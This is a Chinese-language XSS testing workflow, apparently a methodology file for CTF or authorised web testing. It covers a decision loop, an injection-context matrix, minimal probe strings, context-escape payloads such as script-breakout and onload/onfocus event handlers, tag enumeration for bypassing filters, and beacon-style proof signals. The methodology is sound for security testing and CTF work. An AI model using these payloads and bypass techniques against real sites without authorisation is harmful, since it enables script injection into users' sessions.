# XSS 工作流

目标是把不确定的“可能有 XSS”变成可复现的“source -> parser/sink -> 执行/影响”。每轮只新增一个事实。

## 决策循环

1. 基线：保存正常请求/响应、唯一 marker 响应、状态码、响应头、CSP、set-cookie、反射片段和长度。
2. 定位：判断输入进入服务端 HTML、属性、JS、URL、CSS，还是客户端 DOM source。
3. 限制：只测试一个阻塞点，例如 `<`、引号、空格、tag、event、protocol、CSP、TT、sanitizer。
4. 假设：生成一个最小 payload，不混合多个绕过。
5. 验证：HTTP 证明输出，Playwright 证明浏览器语义和影响。
6. 复盘：记录 allowed/blocked 新事实，决定下一轮最小探测。

## 上下文矩阵

| 上下文 | 识别信号 | 先测什么 | 下一步 |
| --- | --- | --- | --- |
| HTML 文本 | marker 在标签之间 | `A<B`、`<x>`、`&lt;x&gt;` | 能建 tag 才测事件；不能建 tag 就找解码或 DOM sink |
| HTML 属性 | marker 在 `value="..."`、`href=...` 等属性中 | `"`, `'`, 空格, `>`, `/` | 先逃逸属性，再测事件或 URL protocol |
| JS 字符串 | marker 在 `<script>`、内联事件、JSON-in-script | `'`, `"`, `\`, 换行, `</script>` | 保持语法有效后插入最小表达式 |
| JS 表达式 | marker 已在可执行表达式位置 | `console.log(1)`、逗号表达式、模板语法 | 再考虑无括号/无空格/受限字符 |
| URL/navigation | marker 进入 `href/src/action/location/open/router` | `javascript:`, `data:`, `//host`, `%0a` | 区分导航、加载资源、fetch/import 和前端路由 |
| CSS/style | marker 在 style 属性、`<style>`、CSS 文件 | `</style><x>`、`url(/probe)` | 现代浏览器 CSS 通常不直接执行 JS，优先找 HTML 逃逸或 scriptless 影响 |
| DOM source/sink | 服务端安全但 JS 读取 hash/search/name/storage/message/API | `#CTX`, `?q=CTX`, `postMessage` | 跟踪 source 到 `innerHTML/eval/url/framework raw HTML` |
| 上传/预览 | 文件内容、文件名、metadata 后续被渲染 | SVG/HTML/Markdown marker、MIME/Content-Type | 确认 origin、inline/attachment、sandbox 和 admin preview |
| Admin Bot | report/share/review/moderator visit | 无害 beacon、title marker、同源状态变化 | 先证 bot visit，再证权限，再取 challenge artifact |

## 最小探测顺序

反射和编码：

```text
CTXMARK123
A<B
A>B
A"B
A'B
A`B
A/B
A=B
A B
A&B
%3Cprobe%3E
&lt;probe&gt;
```

上下文逃逸：

```text
HTML text: <x>
quoted attr: " x="
unquoted attr: x autofocus onfocus=console.log(1)
JS string: ';console.log("XSSPROBE")//
script block: </script><svg/onload=console.log(1)>
URL: javascript:console.log(1)
CSS block: </style><svg/onload=console.log(1)>
```

载体枚举只在 tag 可创建后进行：

```text
<a>x</a>
<m>x</m>
<y>x</y>
<z>x</z>
<zz>x</zz>
<b>x</b>
<x>x</x>
<svg>x</svg>
<math>x</math>
<details>x</details>
<input>
<iframe></iframe>
<video><source></video>
```

如果白盒或黑盒证据显示过滤器按字母范围、首字母或黑名单匹配 tag，例如 `<[a-yA-Y/]+`、`<(script|img|svg)`、`<[a-z]+` 的错误变体，不要只枚举常见标签。先测边界和补集标签：`<a>`、`<m>`、`<y>`、`<z>`、`<zz>`、大小写变体和自定义元素。未知/自定义标签仍可携带全局属性和事件，尤其适合配合 `autofocus/onfocus`、挑战 harness 或脚本主动触发事件。

信号轮换：

```text
console.log('XSSPROBE')
document.title='XSSPROBE'
window.xss_proof=1
new Image().src='/xss-probe'
fetch('/xss-probe',{mode:'no-cors'})
alert(1) / confirm(1) / print()
```

## 强证据后再读 playbook

读取 `bypass-playbook.md` 的条件：

- 已知上下文和阻塞点，例如“属性已逃逸但 event 被删”。
- 已知 sanitizer 输出和最终 DOM 不一致。
- 已知 CSP directive 是当前唯一阻塞。
- 已知 DOM source 和危险 sink。
- 已知上传内容会被目标 origin 或 admin origin 渲染。
- 已知 bot 会访问用户可控内容。

## 失败记录

失败也要可复盘，写链条位置而不是结论：

```text
入口确认：参数 q 已反射到 HTML 文本。
入口逃逸：原始 < 被 block page 拦截。
编码层：&lt; 按字面量渲染，未发现二次解码。
载体：未能创建任何 tag。
DOM 路径：bundle 中未发现把 q/hash/name 写入 innerHTML/document.write 的证据。
CSP/TT：尚未进入相关阶段，因为没有可执行载体。
重新启用条件：发现替代参数、上传预览、客户端 decode sink 或允许标签。
```
